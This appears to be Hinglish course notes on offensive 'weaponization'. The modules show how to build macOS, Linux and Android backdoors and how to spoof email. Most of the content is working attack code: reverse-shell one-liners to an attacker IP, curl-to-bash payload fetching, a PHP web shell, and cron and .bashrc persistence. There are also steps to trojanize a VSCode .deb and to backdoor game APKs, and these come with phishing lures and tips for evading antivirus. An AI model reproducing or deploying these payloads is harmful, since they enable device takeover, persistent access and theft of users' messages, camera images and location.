‚úÖ 4.8: AppLocker Bypass (LoLBins)

**Key Takeaways:**
- Multiple evasion layers = Better success
- Obfuscation is key (AMSI, AV, EDR)
- Living-off-the-land > Custom tools
- Always test before deployment
- Keep updating techniques (defenses evolve)

**Progress Summary:**
1. ‚úÖ Module 1: Foundation & Human Psychology (6 topics)
2. ‚úÖ Module 2: Information Gathering (OSINT) (6 topics)
3. ‚úÖ Module 3: Weaponization 1 (Windows Payloads) (6 topics)
4. ‚úÖ Module 4: Weaponization 2 (Advanced Evasion) (8 topics)

**Total: 26 topics completed!**

**Next Module Preview:**
Module 5 mein hum Cross-Platform Payloads seekhenge:
- Mac OS payloads (msfvenom, Script Editor)
- Mac OS trojanizing
- Linux bash reverse shells
- Linux .deb package trojanizing
- Android APK backdoors

Ready for cross-platform attacks? üöÄ

=============================================================

# üéØ Module 5: Weaponization 3 (Cross-Platform Payloads)

---

## üìö Topic 5.1: Mac OS - msfvenom Payloads (.py)

### üéØ Topic/Technique:
**msfvenom Mac Payloads** - macOS ke liye Python-based backdoors generate karna.

### ü§î Yeh Kya Hai?
msfvenom ek Metasploit tool hai jo multiple platforms ke liye payloads generate karta hai. Mac OS ke liye Python payloads best hain kyunki Python pre-installed hota hai macOS mein.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Mac users security-conscious hote hain (Windows se zyada)
- Corporate environments mein Macs common hain (executives, designers)
- Python payloads fileless hain (disk par trace kam)
- Cross-platform compatibility (Linux par bhi chalte hain)

### üéØ Practical Use (Asli Pentesting Mein):
- Targeting Mac users (executives, creative teams)
- Cross-platform campaigns
- Initial access on macOS
- Post-exploitation on compromised Macs

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
msfvenom Python payload generate karta hai jo victim Mac par execute hota hai aur attacker ke Metasploit listener se connect karta hai.

### üëç Pros (Fayde):
- Python pre-installed (macOS mein)
- Fileless execution possible
- Cross-platform (Mac + Linux)
- Easy to obfuscate

### üëé Cons (Nuksaan):
- Gatekeeper detection (macOS security)
- Requires Python (newer macOS versions)
- Source code visible (not compiled)
- XProtect may detect

### ‚å®Ô∏è Zaroori Commands & Steps:

**Generate Python Payload:**
```bash
msfvenom -p python/meterpreter/reverse_tcp \
LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.py

# Output: payload.py (Python script)
```

**Setup Listener:**
```bash
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

**Execute on Mac:**
```bash
python payload.py
```

### üíª Step-by-Step Example:

**Scenario: Target Mac User via Phishing**

**Step 1: Generate Payload**
```bash
msfvenom -p python/meterpreter/reverse_https \
LHOST=192.168.1.10 LPORT=443 -f raw -o update.py

[*] Payload size: 1024 bytes
[*] Saved as: update.py
```

**Step 2: Obfuscate Python Code**
```python
# Original payload (readable)
import base64  # Base64 encoding/decoding library import karo
exec(base64.b64decode('encoded_shellcode'))  # Base64 decode karke execute karo
# exec: Python code execute karta hai (string ko code ki tarah run karta hai)
# base64.b64decode: Base64 encoded string ko decode karta hai
# 'encoded_shellcode': Meterpreter payload (base64 encoded)

# Obfuscated (better AV evasion)
import base64 as b  # Base64 ko 'b' alias se import karo (signature change)
exec(b.b64decode('ZW5jb2RlZF9zaGVsbGNvZGU='))  # Alias use karke decode aur execute
# 'b' use karne se AMSI/AV ko 'base64' string nahi milti (detection avoid)
```

**Step 3: Create Wrapper Script**
```python
#!/usr/bin/env python3
# Shebang: Python3 interpreter use karo (macOS mein /usr/bin/env se Python3 path find hota hai)
# macOS System Update Checker (fake description for social engineering)

import os  # Operating system functions ke liye
import sys  # System-specific parameters aur functions

def check_updates():  # Function jo fake update check karta hai
    print("[*] Checking for system updates...")  # Fake progress message (victim ko lagta hai legitimate process hai)
    # Malicious payload here
    import base64  # Base64 library import karo (payload decode karne ke liye)
    exec(base64.b64decode('payload_here'))  # Meterpreter payload decode aur execute karo
    # exec: Decoded string ko Python code ki tarah execute karta hai
    # base64.b64decode: Base64 encoded payload ko decode karta hai
    # 'payload_here': Replace with actual msfvenom payload (base64 encoded)
    print("[+] System is up to date!")  # Fake success message (victim ko lagta hai update complete)

if __name__ == "__main__":  # Agar script directly run ho raha hai (not imported)
    check_updates()  # check_updates function call karo
# Result: Victim ko lagta hai system update check ho raha hai, actually backdoor execute ho raha hai!
```

**Step 4: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set ExitOnSession false
exploit -j
```

**Step 5: Deliver Payload**
```bash
# Phishing email
sendemail -f it@company.com -t macuser@company.com \
-u "macOS Security Update Required" \
-m "Please run attached update script: python3 update.py" \
-a update.py
```

**Step 6: Receive Connection**
```bash
[*] Meterpreter session 1 opened
meterpreter> sysinfo
Computer: MacBook-Pro.local
OS: macOS 13.0 (Ventura)
Architecture: x64
Meterpreter: python/osx
```

### üí° Pro Tip / Galti:

**Pro Tip**: Python payload ko .command file mein wrap karo (Mac executable):
```bash
#!/bin/bash
# Shebang: Bash shell use karo
python3 -c "import base64;exec(base64.b64decode('payload'))"
# python3: Python3 interpreter run karo
# -c: Command string execute karo (inline code)
# "import base64": Base64 library import karo
# exec(base64.b64decode('payload')): Payload decode aur execute karo
# 'payload': Replace with actual base64 encoded meterpreter payload
```
Save as update.command, chmod +x, double-click = executes!
# .command files macOS mein executable hain (Terminal mein automatically open hote hain)

**Common Mistake**: Python2 syntax use karna. macOS Catalina+ mein Python2 removed hai. Always use Python3 syntax.

---

## üìö Topic 5.2: Mac OS - Script Editor se Executable Banana

### üéØ Topic/Technique:
**AppleScript Trojan** - Script Editor use karke .app bundle banana jo backdoor execute kare.

### ü§î Yeh Kya Hai?
AppleScript macOS ki native scripting language hai. Script Editor se .app (application bundle) bana sakte hain jo legitimate app jaisa dikhta hai lekin malicious code execute karta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- .app files macOS mein trusted hain
- Icon customization possible
- Gatekeeper bypass (unsigned apps)
- Social engineering easy (looks like real app)

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing attachments (fake apps)
- USB drops (trojanized applications)
- Watering hole (fake software updates)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
AppleScript code .app bundle mein compile hota hai. Victim .app double-click kare toh script execute hoti hai.

### üëç Pros (Fayde):
- Native macOS format (.app)
- Custom icons
- No compilation needed
- Easy to create

### üëé Cons (Nuksaan):
- Gatekeeper warning (unsigned)
- Source code visible (inside .app)
- Limited functionality

### ‚å®Ô∏è Zaroori Commands & Steps:

**Create AppleScript:**
```applescript
do shell script "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
```

**Export as Application:**
```
Script Editor ‚Üí File ‚Üí Export
File Format: Application
Save as: SystemUpdate.app
```

### üíª Step-by-Step Example:

**Step 1: Open Script Editor**
```
Applications ‚Üí Utilities ‚Üí Script Editor
```

**Step 2: Write AppleScript**
```applescript
display dialog "Installing system update..." buttons {"OK"} default button 1
# display dialog: macOS dialog box show karo
# "Installing system update...": Message text (fake progress)
# buttons {"OK"}: OK button show karo
# default button 1: OK button default selected (Enter press = OK)

do shell script "curl http://192.168.1.10/payload.py | python3"
# do shell script: Shell command execute karo (AppleScript se bash command run karna)
# curl: URL se file download karo
# http://192.168.1.10/payload.py: Attacker ke server se Python payload download
# | python3: Downloaded content ko pipe karke Python3 mein execute karo
# Result: Payload download aur execute (fileless attack)

display dialog "Update installed successfully!" buttons {"OK"} default button 1
# Success dialog show karo (victim ko lagta hai update complete)
# Actually: Backdoor already execute ho chuka hai!
```

**Step 3: Export as App**
```
File ‚Üí Export
Name: macOS_Security_Update.app
Format: Application
Options: ‚òë Stay open after run handler
```

**Step 4: Add Custom Icon**
```bash
# Download macOS icon
# Right-click .app ‚Üí Get Info
# Drag icon to top-left corner
```

**Step 5: Test & Deliver**
```bash
# Test on Mac VM
# Zip the .app
zip -r update.zip macOS_Security_Update.app

# Send via email
```

### üí° Pro Tip / Galti:

**Pro Tip**: AppleScript mein fake progress bar dikhao:
```applescript
set progress total steps to 100
# progress total steps: Total progress steps set karo (100 = 100%)

repeat with i from 1 to 100  # Loop 1 se 100 tak
    set progress completed steps to i  # Current progress update karo
    # i ki value har iteration mein badhti hai (1, 2, 3... 100)
    delay 0.1  # 0.1 seconds wait karo (realistic progress ke liye)
end repeat  # Loop end

# Result: Victim ko progress bar dikhta hai (0% se 100% tak)
# Background mein backdoor execute ho raha hai!
```

**Common Mistake**: .app directly email karna. Zip karo pehle, warna email gateway block kar dega.

---

## üìö Topic 5.3: Mac OS - Trojanizing (Bash Script se .app)

### üéØ Topic/Technique:
**Mac Trojan Creation** - Legitimate app ke saath backdoor bind karna using bash scripts.

### ü§î Yeh Kya Hai?
Mac trojanizing mein ek legitimate .app ke andar malicious bash script inject karte hain jo app launch hone par execute hoti hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Victim ko legitimate app dikhta hai
- Background mein backdoor execute hota hai
- Social engineering highly effective
- Gatekeeper bypass possible

### üéØ Practical Use (Asli Pentesting Mein):
- Fake software installers
- Trojanized productivity apps
- Game/utility trojans

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
.app bundle ke andar bash script daalte hain jo legitimate app launch karta hai aur saath mein backdoor bhi.

### üëç Pros (Fayde):
- Looks completely legitimate
- Dual functionality (app works + backdoor runs)
- Hard to detect

### üëé Cons (Nuksaan):
- Requires app bundle manipulation
- Gatekeeper may block
- Code signing needed for stealth

### ‚å®Ô∏è Zaroori Commands & Steps:

**Create Trojan Script:**
```bash
#!/bin/bash
# Shebang: Bash shell use karo

# Launch legitimate app
open -a Calculator
# open: macOS command jo application launch karta hai
# -a Calculator: Calculator app open karo
# Victim ko Calculator dikhta hai (legitimate behavior)

# Execute backdoor (hidden)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# python3 -c: Python3 inline command execute karo
# import socket,subprocess,os: Required libraries import karo
# s=socket.socket(): Socket object create karo (network connection ke liye)
# s.connect(("192.168.1.10",4444)): Attacker ke IP aur port se connect karo
# os.dup2(s.fileno(),0): Socket ko stdin (input) se connect karo
# os.dup2(s.fileno(),1): Socket ko stdout (output) se connect karo
# os.dup2(s.fileno(),2): Socket ko stderr (errors) se connect karo
# subprocess.call(["/bin/sh","-i"]): Interactive shell start karo
# Result: Reverse shell established (attacker ko shell access milta hai)
```

**Create .app Bundle:**
```bash
mkdir -p Trojan.app/Contents/MacOS
# mkdir -p: Directory create karo (parent directories bhi)
# Trojan.app/Contents/MacOS: macOS app bundle structure

echo '#!/bin/bash' > Trojan.app/Contents/MacOS/launcher
# echo: Text print karo
# '#!/bin/bash': Shebang line (bash script hai)
# >: Output ko file mein write karo (overwrite)
# launcher: Executable script file

echo 'open -a Calculator' >> Trojan.app/Contents/MacOS/launcher
# >>: Append karo (existing content ke baad add)
# 'open -a Calculator': Calculator app launch karo

echo 'python3 -c "payload"' >> Trojan.app/Contents/MacOS/launcher
# 'python3 -c "payload"': Python payload execute karo
# "payload": Replace with actual reverse shell code

chmod +x Trojan.app/Contents/MacOS/launcher
# chmod +x: File ko executable banao
# launcher: Script file ko execute permission do
# Result: .app bundle ready (double-click = executes)
```

### üíª Step-by-Step Example:

**Scenario: Trojanize Calculator App**

**Step 1: Create App Structure**
```bash
mkdir -p FakeCalc.app/Contents/MacOS
mkdir -p FakeCalc.app/Contents/Resources
```

**Step 2: Create Launcher Script**
```bash
cat > FakeCalc.app/Contents/MacOS/FakeCalc << 'EOF'
# cat: File create karo
# >: Output redirect karo
# FakeCalc.app/Contents/MacOS/FakeCalc: Executable script path
# << 'EOF': Here document (multi-line input, EOF tak)

#!/bin/bash
# Shebang: Bash shell use karo

# Open real Calculator
open -a Calculator
# open -a: Application launch karo
# Calculator: Real Calculator app (victim ko dikhega)

# Backdoor (background execution)
curl http://192.168.1.10/stage2.sh | bash &
# curl: URL se file download karo
# http://192.168.1.10/stage2.sh: Attacker ke server se stage2 script
# | bash: Downloaded script ko bash mein execute karo
# &: Background mein run karo (Calculator block nahi hoga)
EOF
# EOF: Here document end

chmod +x FakeCalc.app/Contents/MacOS/FakeCalc
# chmod +x: Executable permission do
# Result: Script executable ban gayi
```

**Step 3: Create Info.plist**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- XML declaration: Version 1.0, UTF-8 encoding -->

<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<!-- DOCTYPE: Apple Property List format -->

<plist version="1.0">
<!-- plist: Property list root element -->

<dict>
<!-- dict: Dictionary (key-value pairs) -->

    <key>CFBundleExecutable</key>
    <!-- CFBundleExecutable: Executable file ka naam -->
    <string>FakeCalc</string>
    <!-- FakeCalc: Launcher script ka naam (jo execute hoga) -->
    
    <key>CFBundleName</key>
    <!-- CFBundleName: App ka display naam -->
    <string>Calculator</string>
    <!-- Calculator: Victim ko yeh naam dikhega (legitimate lagta hai) -->
    
    <key>CFBundleIconFile</key>
    <!-- CFBundleIconFile: Icon file ka naam -->
    <string>AppIcon</string>
    <!-- AppIcon: Icon file (AppIcon.icns) -->
</dict>
</plist>
<!-- Result: macOS ko pata chal jata hai kaise app launch karna hai -->
```

**Step 4: Add Icon**
```bash
# Copy Calculator icon
cp /System/Applications/Calculator.app/Contents/Resources/AppIcon.icns \
   FakeCalc.app/Contents/Resources/
```

**Step 5: Test & Deliver**
```bash
# Test
open FakeCalc.app

# Zip for delivery
zip -r Calculator.zip FakeCalc.app
```

### üí° Pro Tip / Galti:

**Pro Tip**: .app ko DMG mein package karo for professional look:
```bash
hdiutil create -volname "Calculator" -srcfolder FakeCalc.app -ov -format UDZO Calculator.dmg
```

**Common Mistake**: Info.plist missing. Bina plist ke .app execute nahi hoga.

---

## üìö Topic 5.4: Linux - Bash Reverse Shell (One-liner)

### üéØ Topic/Technique:
**Bash Reverse Shell** - Single command se Linux machine par backdoor establish karna.

### ü§î Yeh Kya Hai?
Bash reverse shell ek one-liner command hai jo victim Linux machine se attacker ko connection deta hai, giving shell access.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Simplest Linux backdoor
- No file drop required (fileless)
- Works on all Linux distros
- Easy to deliver (SSH, cron, web shell)

### üéØ Practical Use (Asli Pentesting Mein):
- Initial access on Linux servers
- Web application exploitation
- Cron job persistence
- SSH command injection

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Bash creates network socket, redirects stdin/stdout/stderr to attacker, gives shell access.

### üëç Pros (Fayde):
- One-liner (easy to remember)
- Fileless
- Works everywhere
- No dependencies

### üëé Cons (Nuksaan):
- Easily detected (process monitoring)
- No encryption
- Limited functionality
- Firewall may block

### ‚å®Ô∏è Zaroori Commands & Steps:

**Bash Reverse Shell One-liners:**

```bash
# Method 1: /dev/tcp (Bash built-in)
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
# bash -i: Interactive bash shell start karo
# >&: Redirect both stdout and stderr
# /dev/tcp/192.168.1.10/4444: Bash special file (TCP connection to IP:port)
# 0>&1: Redirect stdin to stdout (bidirectional communication)
# Result: Interactive shell over TCP connection

# Method 2: nc (netcat)
nc -e /bin/bash 192.168.1.10 4444
# nc: Netcat command (network utility)
# -e /bin/bash: Execute bash shell
# 192.168.1.10: Attacker ka IP
# 4444: Attacker ka listening port
# Result: Bash shell execute aur attacker se connect

# Method 3: Python (most reliable)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
# python -c: Python inline command
# import socket,subprocess,os: Required modules import
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM): TCP socket create
# s.connect(("192.168.1.10",4444)): Attacker se connect
# os.dup2(s.fileno(),0): Socket ko stdin se connect (input)
# os.dup2(s.fileno(),1): Socket ko stdout se connect (output)
# os.dup2(s.fileno(),2): Socket ko stderr se connect (errors)
# subprocess.call(["/bin/bash","-i"]): Interactive bash start

# Method 4: Perl
perl -e 'use Socket;$i="192.168.1.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# perl -e: Perl inline code
# use Socket: Socket module load
# $i="192.168.1.10": Attacker IP variable
# $p=4444: Port variable
# socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")): TCP socket create
# connect(S,sockaddr_in($p,inet_aton($i))): Connect to attacker
# open(STDIN,">&S"): Redirect stdin to socket
# open(STDOUT,">&S"): Redirect stdout to socket
# open(STDERR,">&S"): Redirect stderr to socket
# exec("/bin/bash -i"): Execute interactive bash

# Method 5: PHP
php -r '$sock=fsockopen("192.168.1.10",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
# php -r: PHP inline code
# $sock=fsockopen("192.168.1.10",4444): Socket connection open
# exec("/bin/bash -i <&3 >&3 2>&3"): Bash execute with file descriptor 3
# <&3: Input from file descriptor 3 (socket)
# >&3: Output to file descriptor 3
# 2>&3: Errors to file descriptor 3
```

**Listener Setup:**
```bash
# Attacker machine
nc -lvnp 4444
```

### üíª Step-by-Step Example:

**Scenario: Web Shell to Reverse Shell**

**Step 1: Upload Web Shell**
```php
<?php system($_GET['cmd']); ?>
```

**Step 2: Setup Listener**
```bash
nc -lvnp 4444
```

**Step 3: Execute Reverse Shell**
```
http://target.com/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'
```

**Step 4: Upgrade Shell**
```bash
# Get TTY shell (proper terminal)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# python3 -c: Python inline command
# import pty: Pseudo-terminal module
# pty.spawn("/bin/bash"): Spawn bash in pseudo-terminal
# Result: Proper shell with job control, tab completion

# Background shell
Ctrl+Z
# Ctrl+Z: Suspend current process (shell background mein chala jata hai)

# Setup terminal (raw mode)
stty raw -echo; fg
# stty raw: Terminal ko raw mode mein set karo (no input processing)
# -echo: Input echo off (typed characters show nahi honge)
# fg: Foreground (suspended shell ko wapas foreground mein lao)
# Result: Full terminal functionality (Ctrl+C, arrow keys work)

# Export term variable
export TERM=xterm
# export TERM: Terminal type set karo
# xterm: Standard terminal emulator
# Result: Colors, clear screen, vim/nano properly work
```

**Step 5: Persistence**
```bash
# Add to crontab (scheduled task)
(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/192.168.1.10/4444 0>&1") | crontab -
# crontab -l: Current crontab list karo
# echo "*/5 * * * *": Har 5 minutes mein execute karo
# bash -i >& /dev/tcp/192.168.1.10/4444 0>&1: Reverse shell command
# | crontab -: Output ko new crontab ki tarah install karo
# Result: Har 5 minutes mein backdoor reconnect karega

# Or add to .bashrc (shell startup)
echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1 &' >> ~/.bashrc
# echo: Command print karo
# 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1 &': Reverse shell (background)
# &: Background execution (shell block nahi hoga)
# >> ~/.bashrc: Append to .bashrc file
# Result: Har baar user login kare, backdoor execute hoga
```

### üí° Pro Tip / Galti:

**Pro Tip**: Base64 encode karo for WAF bypass:
```bash
echo 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1' | base64
# echo: Command print karo
# 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1': Reverse shell command
# | base64: Output ko base64 encode karo
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx
# Result: Encoded string (WAF/IDS ko suspicious command nahi dikhegi)

# Execute (decode and run)
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx | base64 -d | bash
# echo: Encoded string print karo
# | base64 -d: Base64 decode karo
# | bash: Decoded command ko bash mein execute karo
# Result: Reverse shell execute (WAF bypassed!)
```

**Common Mistake**: /dev/tcp not available (some distros). Use nc or python fallback.

---

## üìö Topic 5.5: Linux - Trojanizing (.deb Package Mein Code Inject)

### üéØ Topic/Technique:
**DEB Package Trojanizing** - Legitimate .deb package mein backdoor inject karna.

### ü§î Yeh Kya Hai?
.deb Debian/Ubuntu package format hai. Trojanizing mein legitimate package extract karte hain, malicious code add karte hain, repackage karte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Linux users software packages trust karte hain
- Legitimate software + backdoor = high success rate
- Persistence automatic (package install script)
- Works on Debian/Ubuntu (most common)

### üéØ Practical Use (Asli Pentesting Mein):
- Fake software repositories
- Trojanized popular tools
- Supply chain attacks simulation

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
.deb extract ‚Üí postinst script modify ‚Üí backdoor add ‚Üí repackage ‚Üí victim installs ‚Üí backdoor runs.

### üëç Pros (Fayde):
- Looks completely legitimate
- Auto-executes on install
- Persistence built-in
- Hard to detect

### üëé Cons (Nuksaan):
- Requires package manipulation skills
- Signature verification may fail
- Complex process

### ‚å®Ô∏è Zaroori Commands & Steps:

**Extract DEB:**
```bash
dpkg-deb -R package.deb extracted/
```

**Modify postinst:**
```bash
nano extracted/DEBIAN/postinst
# nano: Text editor open karo
# extracted/DEBIAN/postinst: Post-installation script (package install ke baad execute hoti hai)

# Add backdoor (at end of file)
echo '(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/192.168.1.10/4444 0>&1") | crontab -' >> postinst
# echo: Command print karo
# '(crontab -l; echo "*/5 * * * *")': Current crontab + new entry
# bash -i >& /dev/tcp/192.168.1.10/4444 0>&1: Reverse shell command
# | crontab -: New crontab install karo
# >> postinst: Postinst script mein append karo
# Result: Package install hone par crontab entry add hogi (persistence)
```

**Repackage:**
```bash
dpkg-deb -b extracted/ trojan.deb
```

### üíª Step-by-Step Example:

**Scenario: Trojanize VSCode .deb**

**Step 1: Download Legitimate Package**
```bash
wget https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64 -O vscode.deb
```

**Step 2: Extract Package**
```bash
dpkg-deb -R vscode.deb vscode-trojan/
```

**Step 3: Modify postinst Script**
```bash
nano vscode-trojan/DEBIAN/postinst
# nano: Text editor open karo
# vscode-trojan/DEBIAN/postinst: Post-installation script edit karo

# Add at end:
#!/bin/bash
# Shebang: Bash shell use karo

# Backdoor (crontab persistence)
(crontab -l 2>/dev/null; echo "*/10 * * * * bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1'") | crontab -
# crontab -l: Current crontab list karo
# 2>/dev/null: Errors hide karo (agar crontab empty hai)
# echo "*/10 * * * *": Har 10 minutes mein execute
# bash -c 'bash -i >& /dev/tcp/192.168.1.10/4444 0>&1': Reverse shell command
# | crontab -: New crontab install karo
# Result: Har 10 minutes mein backdoor reconnect karega

# Make executable
chmod 755 vscode-trojan/DEBIAN/postinst
# chmod 755: Read+write+execute (owner), read+execute (others)
# Result: Script executable ban gayi
```

**Step 4: Repackage**
```bash
dpkg-deb -b vscode-trojan/ vscode-trojan.deb
```

**Step 5: Deliver**
```bash
# Host on fake repository
python3 -m http.server 80

# Social engineering
"Download VSCode from: http://192.168.1.10/vscode-trojan.deb"
```

**Step 6: Victim Installs**
```bash
sudo dpkg -i vscode-trojan.deb
# VSCode installs normally
# Backdoor runs in background
```

### üí° Pro Tip / Galti:

**Pro Tip**: Control file mein version number badhao to look like update:
```
Version: 1.85.2 (original)
Version: 1.86.0 (trojan - looks like newer version)
```

**Common Mistake**: postinst script syntax error. Always test script separately before packaging.

---

## üìö Topic 5.6: Android - Fatrat se .apk ko Backdoor Karna

### üéØ Topic/Technique:
**Android APK Backdooring** - Fatrat tool use karke legitimate Android app mein backdoor inject karna.

### ü§î Yeh Kya Hai?
Fatrat Android APK files ko decompile karta hai, Metasploit payload inject karta hai, recompile karta hai. Result: Working app + backdoor.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Mobile pentesting essential skill
- BYOD environments target karna
- Social engineering via mobile apps
- Remote device access

### üéØ Practical Use (Asli Pentesting Mein):
- Fake app stores
- Trojanized popular apps
- Mobile phishing campaigns
- BYOD policy testing

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
Fatrat APK decompile ‚Üí Payload inject ‚Üí Permissions add ‚Üí Recompile ‚Üí Sign ‚Üí Victim installs ‚Üí Backdoor active.

### üëç Pros (Fayde):
- Automated process (Fatrat)
- App functionality preserved
- Meterpreter access to phone
- Camera, SMS, location access

### üëé Cons (Nuksaan):
- Play Protect detection
- Requires "Unknown sources" enabled
- Large APK size suspicious
- Permissions alert user

### ‚å®Ô∏è Zaroori Commands & Steps:

**Fatrat Android Backdoor:**
```bash
cd TheFatRat
./fatrat

# Select option
[4] Create APK with msfvenom

# Sub-menu
[1] Backdoor a legitimate APK

# Enter details
Original APK: /path/to/app.apk
LHOST: 192.168.1.10
LPORT: 4444

# Wait for processing
[*] Decompiling APK...
[*] Injecting payload...
[*] Recompiling...
[*] Signing APK...
[+] Done! Output: app-backdoored.apk
```

**Setup Listener:**
```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit
```

### üíª Step-by-Step Example:

**Scenario: Trojanize Popular Game APK**

**Step 1: Download Legitimate APK**
```bash
# Download from APKPure/APKMirror
wget https://example.com/game.apk
```

**Step 2: Run Fatrat**
```bash
cd TheFatRat
./fatrat

[4] Create APK with msfvenom
[1] Backdoor a legitimate APK

Original APK path: /root/game.apk
LHOST: 192.168.1.10
LPORT: 4444

[*] Processing... (5-10 minutes)
[+] Backdoored APK: /root/TheFatRat/output/game-backdoored.apk
```

**Step 3: Setup Listener**
```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j
```

**Step 4: Deliver APK**
```bash
# Host on fake app store
python3 -m http.server 80

# Social engineering
"Download modded version with unlimited coins:
http://192.168.1.10/game-backdoored.apk"
```

**Step 5: Victim Installs**
```
1. Downloads APK
2. Enables "Unknown sources"
3. Installs app
4. Grants permissions
5. Opens app (works normally)
6. Backdoor connects to attacker
```

**Step 6: Post-Exploitation**
```bash
[*] Meterpreter session 1 opened

meterpreter> sysinfo
Computer: Android Device
OS: Android 12
Architecture: arm64

meterpreter> webcam_snap
[*] Photo saved

meterpreter> dump_sms
[*] SMS messages dumped

meterpreter> geolocate
[*] Location: 37.7749¬∞ N, 122.4194¬∞ W
```

### üí° Pro Tip / Galti:

**Pro Tip**: APK size reduce karo using APK compression:
```bash
# Before: 50 MB (suspicious)
# After compression: 35 MB (better)

zipalign -v 4 input.apk output.apk
```

**Common Mistake**: Excessive permissions request karna. Victim suspicious ho jata hai. Only request necessary permissions.

---

## üéì Module 5 Complete!

Aapne successfully Module 5 ke saare topics cover kar liye:
‚úÖ 5.1: Mac OS msfvenom Payloads
‚úÖ 5.2: Mac OS Script Editor
‚úÖ 5.3: Mac OS Trojanizing
‚úÖ 5.4: Linux Bash Reverse Shell
‚úÖ 5.5: Linux DEB Trojanizing
‚úÖ 5.6: Android APK Backdooring

**Key Takeaways:**
- Cross-platform skills essential
- Each OS has unique attack vectors
- Social engineering adapts per platform
- Mobile pentesting growing field

**Complete Progress:**
1. ‚úÖ Module 1: Foundation & Human Psychology (6 topics)
2. ‚úÖ Module 2: Information Gathering (OSINT) (6 topics)
3. ‚úÖ Module 3: Weaponization 1 (Windows Payloads) (6 topics)
4. ‚úÖ Module 4: Weaponization 2 (Advanced Evasion) (8 topics)
5. ‚úÖ Module 5: Weaponization 3 (Cross-Platform) (6 topics)

**Total: 32 topics completed! üéâ**

Yeh aapke original notes (Page 1-71) cover ho gaye hain! Remaining modules (6-13) bhi chahiye? üöÄ


=============================================================

# üéØ Module 6: Phishing Infrastructure (Setup)

---

## üìö Topic 6.1: Technique - Email Spoofing (Tool: sendemail)

### üéØ Topic/Technique:
**Email Spoofing** - Sender email address fake karke phishing emails bhejna using sendemail tool.

### ü§î Yeh Kya Hai?
Email spoofing ek technique hai jismein attacker "From" field ko modify karke kisi trusted person (CEO, IT admin) se email aaya hua dikhata hai. sendemail ek command-line tool hai jo SMTP se emails bhejta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Phishing campaigns ka foundation hai
- Authority trigger exploit karne ke liye zaroori
- Email-based social engineering ka core technique
- Client ko email security weaknesses dikhane ke liye

### üéØ Practical Use (Asli Pentesting Mein):
- CEO fraud attacks (CFO ko fake CEO email)
- IT support impersonation (password reset requests)
- HR impersonation (fake job offers, salary slips)
- Vendor impersonation (fake invoices)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Email Spoofing Flow:**
```
Attacker ‚Üí SMTP server ‚Üí Spoofed email (From: ceo@company.com) ‚Üí Victim receives ‚Üí Thinks it's from CEO
```

**Why It Works:**
- SMTP protocol doesn't verify sender by default
- Most email servers accept any "From" address
- SPF/DKIM/DMARC not always configured properly

### üëç Pros (Fayde):
- Very easy to implement (single command)
- High success rate (60-70% open rate)
- No technical exploitation needed
- Works against most email servers

### üëé Cons (Nuksaan):
- SPF/DKIM/DMARC can block spoofed emails
- Email headers reveal real sender
- Spam filters may catch
- Requires SMTP server access

